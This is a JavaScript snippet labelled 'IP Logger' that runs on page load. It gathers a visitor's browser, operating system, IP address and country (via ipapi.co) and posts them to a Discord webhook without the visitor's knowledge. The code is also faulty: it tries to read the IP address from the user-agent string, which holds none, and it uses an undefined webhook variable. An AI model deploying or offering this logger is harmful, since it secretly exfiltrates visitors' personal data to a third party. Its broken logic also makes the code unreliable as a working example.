(function () {
  'use strict';

  // Function to send IP data to Discord webhook
  function sendIPDataToDiscord(ipData) {
    const webhookUrl = webHookUrl;
    const message = {
      embeds: [
        {
          title: 'IP Logger',
          description: `IP Address: **${ipData.ip}**\nBrowser: **${ipData.browser}**\nOS: **${ipData.os}**\nCountry: **${ipData.country}**`,
          color: 16777215,
          timestamp: new Date(),
          footer: {
            text: 'IP Logger',
            icon_url: 'https://example.com/favicon.ico',
          },
        },
      ],
    };

    $.post(webhookUrl, message, () => {
      console.log('IP data sent to Discord webhook');
    });
  }

  // Function to get IPdata
  function getIPData() {
    const ipData = {
      ip: '',
      browser: '',
      os: '',
      country: '',
    };

    // Get IP address
    const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
    const ipMatch = navigator.userAgent.match(ipRegex);
    if (ipMatch && ipMatch[0]) {
      ipData.ip = ipMatch[0];
    }

    // Get browser and OS information
    const userAgent = navigator.userAgent;
    const browserMatch = userAgent.match(/(?:Chrome|Firefox|Safari|Opera|MSIE|Trident(?=\/))\/?\s*(\d+)/);
    const osMatch = userAgent.match(/(?:Windows|Macintosh|X11|Linux|Android|iPhone|iPad|iPod|BlackBerry|PlayBook|BB10|Silk|Kindle|Opera Mini|Windows Phone|ChromeOS|XBLWP|LumiaOS|PlayStation|WiiU|Nintendo Switch)/);

    if (browserMatch && browserMatch[1]) {
      ipData.browser = `Browser ${browserMatch[1]}`;
    }

    if (osMatch) {
      ipData.os = osMatch[0];
    }

    // Get country information
    const geoIpUrl = 'https://ipapi.co/' + ipData.ip + '/json/';
    $.getJSON(geoIpUrl, (data) => {
      ipData.country = data.country_name;
      sendIPDataToDiscord(ipData);
    });
  }

  // Call the getIPData function
  getIPData();
})();
